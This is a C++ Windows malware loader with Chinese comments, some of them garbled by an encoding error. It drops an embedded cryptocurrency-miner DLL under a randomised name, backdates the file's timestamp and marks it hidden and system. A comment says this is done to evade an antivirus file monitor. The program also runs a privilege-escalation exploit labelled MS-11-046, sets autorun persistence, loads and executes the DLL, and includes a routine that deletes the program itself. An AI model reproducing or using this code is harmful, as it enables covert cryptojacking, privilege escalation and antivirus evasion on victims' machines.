// DllLoader.cpp: 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "resource.h"
#include "ToolKit.h"
#include "libsysaux.h"

#define  DLLPATH L"./miner.dll"
#define INSTALLER_DEBUG
/************************************************************************/

//随机字符辅助函数
int SEU_RandEx(int min, int max);
//释放资源函数
BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFilePath);

/************************************************************************/

int main()
{

#if 1
	TCHAR dllPath[MAX_PATH];
	TCHAR currentPath[MAX_PATH];
	TCHAR sysPath[MAX_PATH];

	//取得当前目录
	GetCurrentDirectory(MAX_PATH, currentPath);
	//wprintf(currentPath);
	

	//取得系统目录
	GetSystemDirectory(sysPath, MAX_PATH);
	wsprintf(dllPath, L"%s\\S%cm%ct%cH.dll", currentPath, SEU_RandEx('a', 'z'), SEU_RandEx('b', 'y'), SEU_RandEx('c', 'x'));

	wprintf(dllPath);
	printf("\n");
	//释放资源
	ReleaseResource(NULL, IDR_DLL1, L"DLL", dllPath);
#endif
	//wsprintf(mDllPath, "%s\\..\\Debug\\Dllmain.dll", mCurrentPath);
	//printf(mDllPath);

	CSysInfo info;
	if (info.IsRunAsAdmin())
	{
		printf("[+] Admin\n");
	}
	else
	{
		printf("[-] NonAdmin\n");
	}
	info.GetOSInfo();
	
	wprintf(info.m_OSstring);
	printf("\n");
	system("whoami");

	CToolKit kit;
	kit.execExp(CToolKit::EXP_MS_11046);
	
	if (kit.IsKeyEdit())
	{
		printf("[+] Key Edit OK\n");
	}
	else
	{
		printf("[-] Key Edit Failed\n");
	}
	kit.setAutoRun(dllPath);




	HINSTANCE hDllInstace = LoadLibrary(dllPath);
	
	//HINSTANCE hDllInstace = LoadLibrary(dllPath);
	if (hDllInstace)
	{
		VOID(_stdcall *FuncLPRun)();
		//定义函数类型的指针 以接收返回的函数地址
		//__stdcall 很重要 否则报错说类型不匹配

		//(FARPROC&)addFunc = GetProcAddress(hDllInstace, MAKEINTRESOURCE(1));
		//通过def文件中的导出符号的序号
		
		(FARPROC&)FuncLPRun = GetProcAddress(hDllInstace, "TestRun");
		//通过函数符号名

		if (FuncLPRun)
		{
			FuncLPRun();
			printf("[*] Done \n");

		}
		else
		{
			printf("[-] invalid pointer FuncLP \n");
		}
	}
	else
	{
		printf("[-] Dll Load Failed \n");
		return -1;
	}
	//while (true)
	//{

	//}
	//FreeLibrary(hDllInstace);
	Sleep(10000);
	return 0;
}


int SEU_RandEx(int min, int max)
{
	if (min == max)
		return min;

	srand(GetTickCount());
	int seed = rand() + 3;

	return seed % (max - min + 1) + min;
}


BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFilePath)
{
	HGLOBAL hResData;
	HRSRC   hResInfo;
	HANDLE  hFile;
	DWORD   dwBytes;

	TCHAR tmpPath[MAX_PATH], outPath[MAX_PATH];

	GetTempPath(MAX_PATH, tmpPath);
	wprintf(tmpPath);

	wsprintf(outPath, L"%s\\%d_res.tmp", tmpPath, GetTickCount());

	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return FALSE;

	hResData = LoadResource(hModule, hResInfo);
	if (hResData == NULL) return FALSE;

	hFile = CreateFile(outPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL) return FALSE;

	SYSTEMTIME st;
	memset(&st, 0, sizeof(st));
	st.wYear = 2004;
	st.wMonth = 8;
	st.wDay = 17;
	st.wHour = 20;
	st.wMinute = 0;
	FILETIME ft, LocalFileTime;

	SystemTimeToFileTime(&st, &ft);
	LocalFileTimeToFileTime(&ft, &LocalFileTime);
	SetFileTime(hFile, &LocalFileTime, (LPFILETIME)NULL, &LocalFileTime);

	WriteFile(hFile, hResData, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	CloseHandle(hFile);
	FreeResource(hResData);

	// Fuck KV File Create Monitor
	MoveFile(outPath, lpFilePath);
	SetFileAttributes(lpFilePath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
	DeleteFile(outPath);

	return TRUE;
}

#ifndef INSTALLER_DEBUG
//ÔËÐÐÍêºóÉ¾³ý±¾Éí
void DelSelf()
{
	char szModule[MAX_PATH],
		szComspec[MAX_PATH],
		szParams[MAX_PATH];
	// µÃµ½ÎÄ¼þÂ·¾¶:
	if ((GetModuleFileName(0, szModule, MAX_PATH) != 0) &&
		(GetShortPathName(szModule, szModule, MAX_PATH) != 0) &&
		(GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) != 0))
	{
		// ÉèÖÃÃüÁî²ÎÊý
		wsprintf(szParams, " /c del %s > nul", szModule);
		lstrcat(szComspec, szParams);

		// ÉèÖÃ½á¹¹Ìå³ÉÔ±
		STARTUPINFO  si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		// Îª³ÌÐò·ÖÅä×ÊÔ´
		::SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

		// µ÷ÓÃÃüÁî
		if (CreateProcess(0, szComspec, 0, 0, 0, CREATE_SUSPENDED | DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// ÔÝÍ£ÃüÁîÖ±µ½³ÌÐòÍË³ö
			::SetPriorityClass(pi.hProcess, IDLE_PRIORITY_CLASS);
			::SetThreadPriority(pi.hThread, THREAD_PRIORITY_IDLE);
			// »Ö¸´ÃüÁî²¢ÉèÖÃµÍÓÅÏÈÈ¨
			::ResumeThread(pi.hThread);
			return;
		}
		else // Èç¹û³ö´í£¬¸ñÊ½»¯·ÖÅäµÄ¿Õ¼ä
		{
			::SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
			::SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
		}
	}
}
#endif